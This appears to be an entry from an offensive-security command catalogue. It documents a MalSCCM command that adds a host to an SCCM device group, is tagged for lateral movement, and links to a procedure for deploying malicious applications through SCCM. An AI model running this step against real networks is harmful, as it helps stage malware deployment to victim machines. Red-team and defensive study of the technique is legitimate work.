---
id: 771395d1-b828-4992-a5c6-4de3863db41c
type: command
executor: powershell
data: 'MalSCCM.exe group /addhost /groupname:$_GROUP_NAME /host:$_HOSTNAME'
output: null
created_at: '2023-04-06T03:56:08.126328+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - sccm
  - lateral-movement
verified: true
validated: true
---

# Add-host-to-target-group-using-MalSCCM

## Command

```powershell
MalSCCM.exe group /addhost /groupname:$_GROUP_NAME /host:$_HOSTNAME
```

## Description

Adds a specific host to an existing device group in SCCM.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /groupname:$_GROUP_NAME | Target group name | Yes |
| /host:$_HOSTNAME | Hostname to add (e.g., WIN2016-SQL) | Yes |

## Examples

### Basic Usage

```powershell
MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
```

## Expected Output

Host 'WIN2016-SQL' added to 'TargetGroup'.

Success confirmation.

## Related

- [[procedures/Create-and-Deploy-Malicious-Application-via-SCCM]]
